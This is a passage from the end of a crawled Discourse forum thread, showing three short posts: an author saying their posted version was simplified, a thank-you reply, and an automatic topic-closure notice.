            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/BrokenAdministrator.html'><span itemprop='name'>BrokenAdministrator</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-02T22:19:53Z' class='post-time'>
                    March 2, 2019, 10:19pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-02T22:19:53Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This was a simplified version, Iâ€™ve done many improvements but just donâ€™t see it fit to post them as Iâ€™ve never been one much for tutorial writing. But that is a valid idea.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_9' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/xXxH4CK0RxXx.html'><span itemprop='name'>xXxH4CK0RxXx</span></a>
                (Lulumichen)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-03T13:16:46Z' class='post-time'>
                    March 3, 2019,  1:16pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-03T13:16:46Z'>
              <span itemprop='position'>9</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>thanks a lot. It worked great though.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_10' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/system.html'><span itemprop='name'>system</span></a>
                (system)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-30T13:53:42Z' class='post-time'>
                    March 30, 2019,  1:53pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-30T13:53:42Z'>
              <span itemprop='position'>10</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="m2kBZfs0FJ7n2HsnX5ffwOqQS"></script>
  </body>
  
</html>
